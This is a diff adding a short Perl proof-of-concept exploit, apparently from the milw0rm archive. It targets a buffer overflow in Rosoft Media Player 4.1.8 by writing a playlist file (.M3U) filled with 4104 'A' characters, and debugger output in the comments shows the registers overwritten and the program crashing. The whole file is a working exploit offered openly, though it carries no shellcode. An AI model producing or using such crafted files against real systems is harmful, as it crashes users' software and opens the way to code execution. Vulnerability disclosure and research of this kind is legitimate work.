@@ -1,0 +1,23 @@
+####################################################################
+#Rosoft Media Player  4.1.8  Remote Buffer Overflow ( .M3U)
+#
+# @nolife : Pow...Pow ..If you are kind i'll show my set of supers mega Tools, fuzzers ,and all the automated stuff  i use For M3U/ASX/PLS Pow..Pow ...  
+# Nolifing is actually a Disease... Do not be mean with nolife's
+#
+#
+#   eax=41414141 ebx=41414141 ecx=00000000 edx=00ba9078 esi=0012eb7c edi=00ba9078
+#   eip=00403b9c esp=0012eb4c ebp=0012fb80 iopl=0         nv up ei pl nz na pe nc
+#   cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+#   RosoftMediaPlayerFree+0x3b9c:
+#   00403b9c 8b10            mov     edx,dword ptr [eax]  ds:0023:41414141=????????
+#
+#
+my $chars= "A" x 4104;
+my $file="I_Shot_The_Nolife.m3u";
+open(my $FILE, ">>$file") or die "Cannot open $file: $!";
+print $FILE $chars;
+close($FILE);
+print "$file has been created \n";
+print "Credits:Securfrog";
+
+# milw0rm.com [2008-02-14]
